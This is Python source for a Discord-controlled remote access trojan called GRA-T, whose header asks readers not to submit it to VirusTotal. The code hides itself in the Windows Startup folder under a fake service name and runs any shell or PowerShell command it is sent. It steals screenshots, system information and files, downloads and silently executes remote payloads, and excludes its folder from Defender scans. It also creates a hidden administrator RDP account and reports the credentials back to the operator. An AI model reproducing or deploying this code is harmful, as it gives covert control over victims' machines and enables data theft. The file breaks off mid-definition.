# Please, do not share my code with anyone or scan it using virustotal, because VT shares with every AV soft and makes everything public (i know i put it on github mais c'est l'intention qui compte)
# Made with code and time by @mohacharr on discord and GitHub & Twitter


BOT_TOKEN = "hehhheheheeehehehehehe"

import string
import random
import os
import shutil
import subprocess
import sys

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB for free users

def copy_to_startup():
    """
    Copies the script to the Windows Startup folder and renames it as 'Protection service.exe'.
    """
    # Define the path to the startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    exe_name = "Protection service.exe"
    
    # Get the current script path (works after converting to .exe)
    current_path = os.path.abspath(sys.argv[0])  # sys.argv[0] is the executable path after conversion
    target_path = os.path.join(startup_folder, exe_name)

    # If the program isn't already in the startup folder, copy it there
    if not os.path.exists(target_path):
        try:
            shutil.copyfile(current_path, target_path)
            print(f"Copied to startup folder: {target_path}")
        except Exception as e:
            print(f"Failed to copy to startup: {e}")
            sys.exit(1)  # Exit if it fails to copy
    
    # Optional: Hide the file
    hide_file(target_path)

def hide_file(file_path):
    """
    Hides the file to make it less visible in the startup folder.
    """
    try:
        subprocess.call(['attrib', '+h', file_path])
        print(f"File hidden: {file_path}")
    except Exception as e:
        print(f"Failed to hide file: {e}")

if __name__ == "__main__":
    # Ensure the bot is copied to startup at the beginning
    copy_to_startup()

    
    while True:
        import discord
        import platform
        import os
        import pyautogui
        import asyncio
        import logging
        import subprocess
        import requests
        from discord.ext import commands
        from discord import app_commands
        import ctypes
        import sys
        import urllib.request
        import json
        import uuid

        PLUGIN_FOLDER = "plugins"
        PLUGIN_PID_FILE = "plugin_pids.json"
        PLUGIN_HOOKS_FILE = "plugin_hooks.json"

        os.makedirs(PLUGIN_FOLDER, exist_ok=True)

        def load_json(path, default={}):
            if not os.path.exists(path):
                return default
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)

        def save_json(path, data):
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)


        # Configure logging
        logging.basicConfig(level=logging.INFO)

        # Initialize bot
        intents = discord.Intents.default()
        intents.message_content = True
        bot = commands.Bot(command_prefix="!", intents=intents)

        # Bot token
        

        # Check for operating system
        is_windows = platform.system() == "Windows"
        is_linux = platform.system() == "Linux"

        # Check for admin/root privileges
        def check_privileges():
            if is_windows:
                try:
                    import ctypes
                    return ctypes.windll.shell32.IsUserAnAdmin() == 1
                except ImportError:
                    return False
            else:
                return os.geteuid() == 0

        # File operations, directory listing, and system commands
        async def execute_command(command):
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            return output.strip()

        # Capture a screenshot
        def capture_screenshot(filename=".ressource1.png"):
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            return filename

        # Get public IP address
        def get_ip():
            try:
                return requests.get("https://api.ipify.org").text
            except Exception as e:
                logging.error("Failed to get IP address:", e)
                return "Unknown"

        # Enable RDP for Windows
        def setup_rdp():
            if is_windows:
                os.system("reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")
                os.system("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes")
                logging.info("✅ RDP enabled and firewall configured.")
            else:
                logging.info("❌ RDP setup not available on Linux.")

        # Add bot to system startup
        def add_to_startup():
            if is_windows:
                startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
                script_path = os.path.abspath(__file__)
                with open(f"{startup_path}\\bot_startup.bat", "w") as f:
                    f.write(f"start /min python \"{script_path}\"")
                logging.info("✅ Bot added to Windows startup.")
            elif is_linux:
                autostart_path = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_path, exist_ok=True)
                with open(f"{autostart_path}/bot_startup.desktop", "w") as f:
                    f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {os.path.abspath(__file__)}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Bot Startup")
                logging.info("✅ Bot added to Linux startup.")

        # Execute shell command
        async def execute_command(command):
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            return output.strip()

        async def send_startup_info(channel):
            system_info = {
                "OS": platform.system(),
                "Release": platform.release(),
                "Version": platform.version(),
                "Machine": platform.machine(),
                "Processor": platform.processor(),
                "Privileges": "🔒 Admin" if check_privileges() else "👤 User",
                "Public IP": get_ip()
            }
            screenshot_file = capture_screenshot()
            file = discord.File(screenshot_file, filename="screenshot.png")

            embed = discord.Embed(
                title="Bot Information 🖥️",
                description="Here is the system information at startup:",
                color=discord.Color.purple()
            )
            for key, value in system_info.items():
                embed.add_field(name=key, value=value, inline=False)
            
            embed.set_image(url="attachment://screenshot.png")

            await channel.send(embed=embed, file=file)

        @bot.tree.command(name="clean", description="🧹 Delete all messages sent by the bot in this channel.")
        async def clean(interaction: discord.Interaction):
            await interaction.response.defer()
            bot_messages = [msg async for msg in interaction.channel.history(limit=1000) if msg.author == bot.user]

            for msg in bot_messages:
                await msg.delete()

            await interaction.followup.send(f"🗑️ Deleted {len(bot_messages)} bot messages in this channel.", ephemeral=True)




        @bot.tree.command(name="systeminfo", description="📊 Get system information and a screenshot.")
        async def systeminfo(interaction: discord.Interaction):
            await send_startup_info(interaction.channel)

        @bot.tree.command(name="cd", description="📂 Change the working directory.")
        async def cd(interaction: discord.Interaction, directory: str):
            try:
                os.chdir(directory)
                await interaction.response.send_message(f"📂 Changed directory to {directory}")
            except FileNotFoundError:
                await interaction.response.send_message("❌ Directory not found.")

        @bot.tree.command(name="ls", description="📄 List files in the current directory.")
        async def ls(interaction: discord.Interaction):
            files = "\n".join(os.listdir())
            await interaction.response.send_message(f"Files:\n{files}")

        @bot.tree.command(name="ping", description="🏓 Check bot's online status.")
        async def ping(interaction: discord.Interaction):
            await interaction.response.send_message("Bot is online and active 🟢.")

        @bot.tree.command(name="run", description="🚀 Run a program or command.")
        async def run(interaction: discord.Interaction, program: str):
            result = await execute_command(program)
            await interaction.response.send_message(f"Output:\n{result}")

        @bot.tree.command(name="ip", description="🌐 Get the public IP address.")
        async def ip(interaction: discord.Interaction):
            ip_address = get_ip()
            await interaction.response.send_message(f"Public IP Address: {ip_address} 🌐")

        @bot.tree.command(name="upload", description="📤 Upload a file to the bot.")
        async def upload(interaction: discord.Interaction, file: discord.Attachment):
            await file.save(file.filename)
            await interaction.response.send_message(f"File {file.filename} uploaded successfully 📁.")


        import sys
        import ctypes
        import os
        import discord
        import time

        

        import discord
        from discord.ext import commands
        import subprocess
        import os
        import urllib.request

        @bot.tree.command(name="rungit")
        async def rungit(interaction: discord.Interaction, github_url: str, args: str = ""):
            """
            Downloads a GitHub script or EXE into a hidden directory and executes it silently.
            Supports .bat, .ps1, and .exe files.
            """
            await interaction.response.defer()
            
            try:
                # Extract filename and validate
                filename = github_url.split("/")[-1]
                valid_extensions = [".bat", ".ps1", ".exe"]
                
                if not any(filename.endswith(ext) for ext in valid_extensions):
                    await interaction.followup.send("Error: Only .bat, .ps1, and .exe files are allowed.")
                    return

                # Generate random key
                random_key = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

                # Prepare hidden directory
                hidden_dir = ".hidden_downloads"
                os.makedirs(hidden_dir, exist_ok=True)
                filepath = os.path.join(hidden_dir, filename)
                
                # Download script
                urllib.request.urlretrieve(github_url, filepath)
                
                # Append silent execution options
                args += f' -o {random_key}'
                
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides the window (Windows only)

                if filename.endswith(".bat"):
                    silent_filepath = os.path.join(hidden_dir, f"silent_{filename}")
                    with open(silent_filepath, "w", encoding="utf-8") as f:
                        f.write(f"@echo off\n{filepath} {args}")  # Ensure script does not echo anything
                    result = subprocess.run(f'start /min cmd /c "{silent_filepath}"', shell=True, text=True, capture_output=True, startupinfo=si)
                
                elif filename.endswith(".ps1"):
                    silent_filepath = os.path.join(hidden_dir, f"silent_{filename}")
                    with open(silent_filepath, "w", encoding="utf-8") as f:
                        f.write(f"$ErrorActionPreference = 'SilentlyContinue'; Start-Process -WindowStyle Hidden -FilePath '{filepath}' -ArgumentList '{args}' -NoNewWindow")
                    result = subprocess.run(f'powershell -ExecutionPolicy Bypass -File "{silent_filepath}"', shell=True, text=True, capture_output=True, startupinfo=si)
                
                elif filename.endswith(".exe"):
                    result = subprocess.run(f'start /min "{filepath}" {args}', shell=True, text=True, capture_output=True, startupinfo=si)

                # Save output
                output_filepath = os.path.join(hidden_dir, f"{filename}_output.txt")
                with open(output_filepath, "w", encoding="utf-8") as f:
                    f.write("Output:\n" + result.stdout + "\nErrors:\n" + result.stderr)
                
                # Send output file to Discord
                await send_large_file(interaction, output_filepath)
                
                # Cleanup
                os.remove(filepath)
                os.remove(output_filepath)
                
            except Exception as e:
                await interaction.followup.send(f"An error occurred: {str(e)}")

        async def send_large_file(interaction, filepath):
            """Splits and sends large files to Discord."""
            MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB Discord limit
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            
            parts = [content[i:i + MAX_FILE_SIZE] for i in range(0, len(content), MAX_FILE_SIZE)]
            for idx, part in enumerate(parts):
                part_path = f"{filepath}_part{idx + 1}.txt"
                with open(part_path, "w", encoding="utf-8") as f:
                    f.write(part)
                await interaction.followup.send(file=discord.File(part_path))
                os.remove(part_path)


        @bot.tree.command(name="exclude", description="🚫 Exclude the bot folder from antivirus scans (requires admin).")
        async def exclude(interaction: discord.Interaction):
            # Check for admin privileges
            if not ctypes.windll.shell32.IsUserAnAdmin():
                await interaction.response.send_message("❌ Please run the bot with admin privileges to execute this command.")
                return
            
            # Get the folder path to exclude (e.g., current working directory)
            folder_to_exclude = os.getcwd()
            
            # Example for Windows Defender exclusion
            try:
                # Add the folder exclusion using Windows Defender PowerShell command
                exclude_command = (
                    f"powershell -Command "
                    f"Add-MpPreference -ExclusionPath '{folder_to_exclude}'"
                )
                subprocess.run(exclude_command, shell=True, check=True)
                await interaction.response.send_message(f"✅ Successfully excluded the folder:\n{folder_to_exclude} from antivirus scans.")
            except subprocess.CalledProcessError as e:
                await interaction.response.send_message(f"❌ Failed to exclude folder. Error: {e}")

        categories = {
            "System Info & Monitoring": [
                {"label": "Get System Specs", "url": "", "description": "Lists CPU, RAM, GPU, and OS details."},
                {"label": "Check Disk Space", "url": "", "description": "Shows available storage on all drives."},
                {"label": "Monitor Resource Usage", "url": "", "description": "Displays real-time CPU, RAM, and network usage."},
                {"label": "List Running Processes", "url": "", "description": "Shows all active processes and their PIDs."}
            ],
            "File Management": [
                {"label": "List Files in a Directory", "url": "", "description": "Shows contents of a given folder."},
                {"label": "Search for a File", "url": "", "description": "Finds a file by name anywhere on the system."},
                {"label": "Delete a File", "url": "", "description": "Deletes a specified file (with confirmation)."},
                {"label": "Move or Copy Files", "url": "", "description": "Moves or duplicates files between directories."}
            ],
            "Networking": [
                {"label": "Get Public & Local IP", "url": "", "description": "Displays current IP addresses."},
                {"label": "Check Internet Speed", "url": "", "description": "Runs a speed test (ping, upload, download)."},
                {"label": "Ping a Website", "url": "", "description": "Checks if a site is reachable."},
                {"label": "Get Open Ports", "url": "", "description": "Lists open network ports on the system."}
            ],
            "System Control": [
                {"label": "Shutdown / Restart / Log Off", "url": "", "description": "Lets the bot control power options."},
                {"label": "Lock Screen", "url": "", "description": "Locks the computer instantly."},
                {"label": "Kill a Process", "url": "", "description": "Ends a task by name or PID."}
            ],
            "Automation & Utilities": [
                {"label": "Open a Website", "url": "", "description": "Launches a URL in the default browser."},
                {"label": "Take a Screenshot", "url": "", "description": "Captures and sends a screenshot."},
                {"label": "Record Audio", "url": "", "description": "Records mic input and sends the file."},
                {"label": "Text-to-Speech", "url": "", "description": "Reads text aloud using the system’s TTS."},
                {"label": "Run a Specific Program", "url": "", "description": "Launches an application (e.g., Notepad, VSCode)."}
            ]
        }

        class FuntimeMenu(discord.ui.View):
            def __init__(self):
                super().__init__()
                self.add_item(CategorySelect())

        class CategorySelect(discord.ui.Select):
            def __init__(self):
                options = [discord.SelectOption(label=category, description=f"View scripts for {category}") for category in categories]
                super().__init__(placeholder="Choose a category...", options=options)

            async def callback(self, interaction: discord.Interaction):
                selected_category = self.values[0]
                scripts = categories[selected_category]

                embed = discord.Embed(title=f"{selected_category} Scripts", color=discord.Color.purple())
                for script in scripts:
                    embed.add_field(name=script["label"], value=f"[Script Link]({script['url']})\n{script['description']}", inline=False)

                await interaction.response.send_message(embed=embed, ephemeral=True)
            
        @bot.tree.command(name="funtime", description="📜 Browse and select scripts for operations.")
        async def funtime(interaction: discord.Interaction):
            await interaction.response.send_message("🔽 Select a category from the menu below:", view=FuntimeMenu(), ephemeral=True)


        @bot.tree.command(name="runcmd")
        async def runcmd(interaction: discord.Interaction, command: str):
            result = subprocess.run(command, shell=True, text=True, capture_output=True)
            await interaction.response.send_message(f"Output:\n{result.stdout}\nErrors:\n{result.stderr}")

        @bot.tree.command(name="runsh")
        async def runsh(interaction: discord.Interaction, script: str):
            result = subprocess.run(f"bash -c '{script}'", shell=True, text=True, capture_output=True)
            await interaction.response.send_message(f"Output:\n{result.stdout}\nErrors:\n{result.stderr}")

        @bot.tree.command(name="runpwsh")
        async def runpwsh(interaction: discord.Interaction, script: str):
            result = subprocess.run(f"powershell -Command {script}", shell=True, text=True, capture_output=True)
            await interaction.response.send_message(f"Output:\n{result.stdout}\nErrors:\n{result.stderr}")

        @bot.tree.command(name="uac", description="⚙️ Elevate bot to administrator privileges.")
        async def uac(interaction: discord.Interaction):
                    # Temporary handshake file to confirm elevation success
                    handshake_file = "admin_elevated.txt"

                    # Defer the response to give more time for the command to complete
                    await interaction.response.defer()

                    # Check if the bot already has administrator privileges
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        await interaction.followup.send("✅ Bot is already running as Administrator.")
                        return
                    else:
                        # Clear any old handshake file
                        if os.path.exists(handshake_file):
                            os.remove(handshake_file)

                        # Relaunch the bot with admin privileges and close the non-admin instance if successful
                        script_path = os.path.abspath(sys.argv[0])
                        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])

                        try:
                            # Launch the script as Administrator
                            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}" {params}', None, 1)
                            await interaction.followup.send("🔄 Attempting to elevate to Administrator. Please confirm the UAC prompt.")

                            # Check for the handshake file for a limited time
                            for _ in range(10):  # Wait for up to 10 seconds
                                if os.path.exists(handshake_file):
                                    await interaction.followup.send("✅ UAC elevation successful.")
                                    os.remove(handshake_file)  # Clean up handshake file
                                    os._exit(0)  # Close the non-admin instance
                                time.sleep(1)

                            # If handshake file not found, UAC was likely not accepted
                            await interaction.followup.send("❌ UAC elevation was not accepted.")
                        except Exception as e:
                            await interaction.followup.send(f"❌ Failed to elevate privileges: {e}")

                # In the elevated instance, create the handshake file to confirm admin status
        if ctypes.windll.shell32.IsUserAnAdmin():
                    with open("admin_elevated.txt", "w") as f:
                        f.write("Elevated")

                        
        @bot.tree.command(name="unpersist", description="🚮 Remove the bot completely from the system.")
        async def unpersist(interaction: discord.Interaction):
            if not ctypes.windll.shell32.IsUserAnAdmin():
                await interaction.response.send_message("❌ Please run /uac first to get admin privileges.")
                return

            try:
                # Define paths to delete, including the bot's main script
                script_path = os.path.abspath(sys.argv[0])
                
                # Remove the bot script
                os.remove(script_path)
                
                # Add additional cleanup logic if there are registry entries, tasks, or files to delete
                
                await interaction.response.send_message("✅ Bot has been removed from the system.")
            except Exception as e:
                await interaction.response.send_message(f"❌ Failed to remove the bot: {e}")


        @bot.tree.command(name="download", description="📥 Download a file from the bot's directory.")
        async def download(interaction: discord.Interaction, filename: str):
            if os.path.exists(filename):
                await interaction.response.send_message(file=discord.File(filename))
            else:
                await interaction.response.send_message("❌ File not found.")

        def generate_password(length=16):
            characters = string.ascii_letters + string.digits + string.punctuation
            return ''.join(random.choice(characters) for _ in range(length))

        def setup_rdp():
            # Enable RDP
            subprocess.run("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", shell=True)
            
            # Allow RDP through firewall
            subprocess.run("netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes", shell=True)
            
            # Create a new user with a random password
            username = "rdpuser"
            password = generate_password()
            subprocess.run(f"net user {username} {password} /add", shell=True)
            subprocess.run(f"net localgroup Administrators {username} /add", shell=True)
            
            # Get public IP
            public_ip = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip()
            
            return public_ip, username, password

        @bot.tree.command(name="setup_rdp", description="🔒 Set up RDP (Windows only).")
        async def setup_rdp_command(interaction: discord.Interaction):
            if os.name == "nt":
                ip, user, password = setup_rdp()
                await interaction.response.send_message(
                    f"🔒 RDP enabled! Connect using the details below:\n\n"
                    f"🌍 **IP Address:** `{ip}`\n"
                    f"👤 **Username:** `{user}`\n"
                    f"🔑 **Password:** `{password}`\n"
                )
            else:
                await interaction.response.send_message("RDP setup is only available on Windows ❌.")


        @bot.tree.command(name="find", description="🔍 Search for files in the system.")
        async def find(interaction: discord.Interaction, filename: str):
            """Search for files in the system based on the given filename."""
            await interaction.response.defer()
            
            search_results = []
            for root, _, files in os.walk("/"):
                if filename in files:
                    search_results.append(os.path.join(root, filename))
                    if len(search_results) >= 10:
                        break  # Limit results to prevent overload
            
            if search_results:
                response = "\n".join(search_results)
            else:
                response = "No files found."
            
            await interaction.followup.send(f"Search results:\n{response}", ephemeral=True)


        @bot.tree.command(name="tts", description="🎤 Use text-to-speech.")
        async def tts(interaction: discord.Interaction, message: str):
            if is_windows:
                os.system(f'powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{message}\');"')
            else:
                os.system(f'espeak "{message}"')
            await interaction.response.send_message(f"Message spoken: {message} 🎤")

        @bot.tree.command(name="credits", description="👥 Show credits for GRA-T.")
        async def credits(interaction: discord.Interaction):
            embed = discord.Embed(
                title="👥 Credits - GRA-T",
                description="This bot was developed by the **PhantomNode** team  ",
                color=discord.Color.purple()
            )
            embed.set_footer(text="GRA-T (Goatesque Remote Access Tool) 🐐")
            await interaction.response.send_message(embed=embed)



        @bot.tree.command(name="help", description="📚 View available bot commands.")
        async def help(interaction: discord.Interaction):
            embed = discord.Embed(
                title="Bot Command Help 📚",
                description="Listing GRA-T bot commands :",
                color=discord.Color.purple()
            )

            commands = [
                ("/clean", "🧹 Delete all messages sent by the bot in this channel."),
                ("/systeminfo", "📊 Get system information and a screenshot."),
                ("/cd <directory>", "📂 Change the working directory."),
                ("/ls", "📄 List files in the current directory."),
                ("/ping", "🏓 Check bot's online status."),
                ("/run <program>", "🚀 Run a program or command."),
                ("/ip", "🌐 Get the public IP address."),
                ("/upload <file>", "📤 Upload a file to the bot."),
                ("/uac", "⚙️ Elevate bot to administrator privileges."),
                ("/exclude", "🚫 Exclude the bot from antivirus scans (requires admin)."),
                ("/runcmd <command>", "🖥️ Run a shell command."),
                ("/runsh <script>", "⚙️ Run a shell script."),
                ("/runpwsh <script>", "⚙️ Run a PowerShell script."),
                ("/unpersist", "🚮 Remove the bot completely from the system."),
                ("/download <filename>", "📥 Download a file from the bot's directory."),
                ("/setup_rdp", "🔒 Set up RDP (Windows only)."),
                ("/tts <message>", "🎤 Use text-to-speech."),
            ]

            for command, description in commands:
                embed.add_field(name=command, value=description, inline=False)

            embed.set_footer(text="GRA-T (Goatesque Remote Access Tool) 🐐")

            await interaction.response.send_message(embed=embed)
        @bot.tree.command(name="test", description="A test command.")
        async def test(interaction: discord.Interaction):
            await interaction.response.send_message("Test command works!")

        # Utils for splitting output into files
        async def send_large_output(interaction, output_text, base_filename="output"):
            MAX_SIZE = 8 * 1024 * 1024  # 8 MB
            parts = [output_text[i:i + MAX_SIZE] for i in range(0, len(output_text), MAX_SIZE)]
            
            for i, part in enumerate(parts):
                filename = f"{base_filename}_part{i+1}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(part)
                await interaction.followup.send(file=discord.File(filename))
                os.remove(filename)

        # === PROCESS COMMAND GROUP ===
        class Process(app_commands.Group):
            def __init__(self):
                super().__init__(name="process", description="🔧 Process management commands")

            @app_commands.command(name="list", description="📋 List all active processes")
            async def list_processes(self, interaction: discord.Interaction):
                await interaction.response.defer()
                try:
                    result = subprocess.check_output("tasklist", shell=True, text=True)
                except subprocess.CalledProcessError as e:
                    result = e.output
                await send_large_output(interaction, result, "processes")

            @app_commands.command(name="kill", description="🛑 Kill a process by name or PID")
            async def kill_process(self, interaction: discord.Interaction, name_or_pid: str):
                await interaction.response.defer()
                try:
                    # Try PID first, fallback to name
                    if name_or_pid.isdigit():
                        result = subprocess.check_output(f"taskkill /PID {name_or_pid} /F", shell=True, text=True)
                    else:
                        result = subprocess.check_output(f"taskkill /IM {name_or_pid} /F", shell=True, text=True)
                except subprocess.CalledProcessError as e:
                    result = e.output
                await send_large_output(interaction, result, "process_kill")

            @app_commands.command(name="help", description="📘 Show help for process commands")
            async def help_process(self, interaction: discord.Interaction):
                embed = discord.Embed(title="🧠 /process Help", color=discord.Color.dark_red())
                embed.add_field(name="/process list", value="📋 List all running processes", inline=False)
                embed.add_field(name="/process kill <name|PID>", value="🛑 Kill a process by name or PID", inline=False)
                await interaction.response.send_message(embed=embed, ephemeral=True)

        # === SERVICE COMMAND GROUP ===
        class Service(app_commands.Group):
            def __init__(self):
                super().__init__(name="service", description="⚙️ Service management commands")

            @app_commands.command(name="list", description="📋 List all services")
            async def list_services(self, interaction: discord.Interaction):
                await interaction.response.defer()
                try:
                    result = subprocess.check_output("sc query type= service state= all", shell=True, text=True)
                except subprocess.CalledProcessError as e:
                    result = e.output
                await send_large_output(interaction, result, "services")

            @app_commands.command(name="help", description="📘 Show help for service commands")
            async def help_services(self, interaction: discord.Interaction):
                embed = discord.Embed(title="⚙️ /service Help", color=discord.Color.blue())
                embed.add_field(name="/service list", value="📋 List all system services", inline=False)
                await interaction.response.send_message(embed=embed, ephemeral=True)

        # === Register the Command Groups ===
        bot.tree.add_command(Process())
        bot.tree.add_command(Service())
        @bot.tree.command(name="plugin_import", description="📥 Import a .grataddin plugin file")
        async def plugin_import(interaction: discord.Interaction, file: discord.Attachment):
            await interaction.response.defer()

            if not file.filename.endswith(".grataddin"):
                await interaction.followup.send("❌ Only `.grataddin` files are allowed.")
                return

            # Temporarily save the uploaded file
            temp_path = os.path.join(PLUGIN_FOLDER, f"__temp_import__.grataddin")
            await file.save(temp_path)

            # Read and parse metadata
            with open(temp_path, "r", encoding="utf-8-sig") as f:
                lines = f.readlines()

            metadata = {}
            for line in lines:
                clean = line.strip().lstrip('\ufeff')
                if clean.lower().startswith("# plugin."):
                    try:
                        key, value = clean[2:].split(":", 1)
                        metadata[key.strip()] = value.strip()
                    except ValueError:
                        continue

            required_keys = ["plugin.name", "plugin.description", "plugin.lang", "plugin.ositworkswith", "plugin.commands"]
            missing = [k for k in required_keys if k not in metadata]

            if missing:
                await interaction.followup.send(f"❌ Invalid plugin file.\nMissing metadata field(s): `{', '.join(missing)}`")
                os.remove(temp_path)
                return

            # Parse args
            args_value = metadata.get("plugin.args", "").strip().lower()
            args_struct = []
            if args_value != "none" and args_value != "":
                for arg in args_value.split():
                    if ":" not in arg:
                        await interaction.followup.send(f"❌ Invalid argument format: `{arg}`.\nUse `name:type` or `None`.")
                        os.remove(temp_path)
                        return
                    name, arg_type = arg.split(":")
                    args_struct.append({"name": name, "type": arg_type})
            metadata["plugin.args"] = args_value
            metadata["args_parsed"] = args_struct

            # Determine clean plugin name
            plugin_name = metadata["plugin.name"].replace(" ", "_")

            # Final save path using metadata name
            final_plugin_path = os.path.join(PLUGIN_FOLDER, f"{plugin_name}.grataddin")
            final_meta_path = os.path.join(PLUGIN_FOLDER, f"{plugin_name}.json")

            os.rename(temp_path, final_plugin_path)

            with open(final_meta_path, "w", encoding="utf-8") as f:
                json.dump(metadata, f, indent=4)

            # Build response embed
            embed = discord.Embed(
                title="✅ Plugin Imported",
                description=f"Plugin `{plugin_name}` imported and registered.",
                color=discord.Color.green()
            )
            for k in required_keys + ["plugin.args"]:
                val = metadata.get(k, "(none)").strip()
                embed.add_field(name=k, value=val or "(none)", inline=False)

            await interaction.followup.send(embed=embed)


        @bot.tree.command(name="plugin_use", description="⚙️ Execute a plugin by name")
        async def plugin_use(interaction: discord.Interaction, name: str, args:str):
            await interaction.response.defer()

            path = os.path.join(PLUGIN_FOLDER, name + ".grataddin")
            meta_path = os.path.join(PLUGIN_FOLDER, name + ".json")

            if not os.path.exists(path) or not os.path.exists(meta_path):
                await interaction.followup.send("❌ Plugin not found.")
                return

            with open(meta_path, "r", encoding="utf-8") as f:
                metadata = json.load(f)

            expected_args = metadata.get("args_parsed", [])
            user_args = dict(arg.split("=", 1) for arg in args if "=" in arg)

            # Validate all required args
            for arg in expected_args:
                if arg["name"] not in user_args:
                    await interaction.followup.send(f"❌ Missing required arg: `{arg['name']}`")
                    return

            lang = metadata["lang"].lower()
            env = os.environ.copy()
            webhook = load_json(PLUGIN_HOOKS_FILE).get(str(interaction.user.id))
            if webhook:
                env["GRA_T_PLUGIN_WEBHOOK"] = webhook

            # Order args for subprocess
            cli_args = [user_args[arg["name"]] for arg in expected_args]

            try:
                if lang == "python":
                    cmd = ["python", path] + cli_args
                elif lang == "powershell":
                    cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", path] + cli_args
                elif lang == "batch":
                    cmd = ["cmd", "/c", path] + cli_args
                elif lang == "bash":
                    cmd = ["bash", path] + cli_args
                else:
                    await interaction.followup.send(f"❌ Unsupported plugin language: `{lang}`")
                    return

                process = subprocess.Popen(cmd, env=env)
                pids = load_json(PLUGIN_PID_FILE)
                pids[name] = process.pid
                save_json(PLUGIN_PID_FILE, pids)

                await interaction.followup.send(f"✅ Plugin `{name}` running (PID {process.pid})")

            except Exception as e:
                await interaction.followup.send(f"❌ Failed to run plugin: {str(e)}")


        @bot.tree.command(name="plugin_stop", description="🛑 Stop a running plugin by name")
        async def plugin_stop(interaction: discord.Interaction, name: str):
            await interaction.response.defer()

            pids = load_json(PLUGIN_PID_FILE)
            pid = pids.get(name)
            if not pid:
                await interaction.followup.send("❌ Plugin not running or not found.")
                return

            try:
                os.kill(pid, 9)
                del pids[name]
                save_json(PLUGIN_PID_FILE, pids)
                await interaction.followup.send(f"✅ Plugin `{name}` was stopped.")
            except Exception as e:
                await interaction.followup.send(f"❌ Failed to stop plugin: {str(e)}")

        @bot.tree.command(name="plugin_stopall", description="🚫 Stop all running plugins")
        async def plugin_stopall(interaction: discord.Interaction):
            await interaction.response.defer()
            pids = load_json(PLUGIN_PID_FILE)
            stopped = 0

            for name, pid in pids.items():
                try:
                    os.kill(pid, 9)
                    stopped += 1
                except: pass

            save_json(PLUGIN_PID_FILE, {})
            await interaction.followup.send(f"✅ Stopped {stopped} plugin(s).")

        @bot.tree.command(name="plugin_delete", description="🗑️ Delete a plugin")
        async def plugin_delete(interaction: discord.Interaction, name: str):
            await interaction.response.defer()

            path = os.path.join(PLUGIN_FOLDER, name + ".grataddin")
            if not os.path.exists(path):
                await interaction.followup.send("❌ Plugin not found.")
                return

            try:
                os.remove(path)
                pids = load_json(PLUGIN_PID_FILE)
                pids.pop(name, None)
                save_json(PLUGIN_PID_FILE, pids)
                await interaction.followup.send(f"🗑️ Plugin `{name}` deleted.")
            except Exception as e:
                await interaction.followup.send(f"❌ Failed to delete plugin: {str(e)}")

        @bot.tree.command(name="plugin_sethook", description="🔗 Set your webhook URL for plugin file uploads")
        async def plugin_sethook(interaction: discord.Interaction, url: str):
            hooks = load_json(PLUGIN_HOOKS_FILE)
            hooks[str(interaction.user.id)] = url
            save_json(PLUGIN_HOOKS_FILE, hooks)
            await interaction.response.send_message("✅ Webhook set successfully.")

        @bot.tree.command(name="plugin", description="📘 Show help for all plugin commands")
        async def plugin_help(interaction: discord.Interaction):
            embed = discord.Embed(
                title="📘 Plugin System Help",
                description="Manage and run `.grataddin` plugin scripts",
                color=discord.Color.purple()
            )
            embed.add_field(name="/plugin import [file]", value="📥 Import a new plugin file", inline=False)
            embed.add_field(name="/plugin use [name] [args]", value="⚙️ Execute a plugin", inline=False)
            embed.add_field(name="/plugin stop [name]", value="🛑 Stop a plugin", inline=False)
            embed.add_field(name="/plugin stopall", value="🚫 Stop all plugins", inline=False)
            embed.add_field(name="/plugin delete [name]", value="🗑️ Delete a plugin", inline=False)
            embed.add_field(name="/plugin sethook [url]", value="🔗 Set webhook for file uploads", inline=False)
            await interaction.response.send_message(embed=embed, ephemeral=True)


        @bot.tree.command(name="plugin_info", description="🔎 Show detailed info about a plugin")
        @app_commands.describe(name="Plugin name to inspect")
        async def plugin_info(interaction: discord.Interaction, name: str):
            await interaction.response.defer()

            meta_path = os.path.join(PLUGIN_FOLDER, f"{name}.json")
            if not os.path.exists(meta_path):
                await interaction.followup.send("❌ Plugin not found.")
                return

            with open(meta_path, "r", encoding="utf-8") as f:
                metadata = json.load(f)

            embed = discord.Embed(
                title=f"🔎 Plugin Info: {name}",
                color=discord.Color.teal()
            )

            # Display full metadata
            for k, v in metadata.items():
                if k == "args_parsed":
                    continue  # skip internal
                val = json.dumps(v, indent=2) if isinstance(v, list or dict) else str(v)
                embed.add_field(name=k, value=val or "(none)", inline=False)

            await interaction.followup.send(embed=embed)

        @bot.tree.command(name="plugin_list", description="📜 List all imported plugins")
